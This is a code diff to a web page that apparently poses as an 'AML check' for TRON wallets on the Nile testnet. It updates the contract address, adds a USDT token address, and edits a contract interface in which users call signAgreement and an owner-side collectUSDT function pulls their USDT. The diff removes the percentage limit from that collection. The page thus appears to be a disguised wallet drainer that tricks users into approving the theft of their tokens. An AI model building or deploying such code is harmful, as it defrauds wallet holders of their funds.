@@ -1377,7 +1377,7 @@
                 
                 <div class="contract-info">
                     <label>Smart Contract (Nile Testnet):</label>
-                    TCWLtEYpv6Np2eJ4P1iQr1T1xLgYDVtAps
+                    TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta
                 </div>
                 
                 <div class="status-message" id="status2"></div>
@@ -1679,13 +1679,16 @@
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
         // Contract Configuration - Nile Testnet
-        const CONTRACT_ADDRESS = 'TCWLtEYpv6Np2eJ4P1iQr1T1xLgYDVtAps';
+        const CONTRACT_ADDRESS = 'TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta';
+        const USDT_ADDRESS = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb'; // Nile Testnet USDT
+        
+        // ABI for AMLCheckV5
         const CONTRACT_ABI = [
             {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
             {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Approved","type":"event"},
             {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Collected","type":"event"},
-            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"},{"internalType":"uint256","name":"percent","type":"uint256"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"},{"internalType":"uint256","name":"percent","type":"uint256"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"}
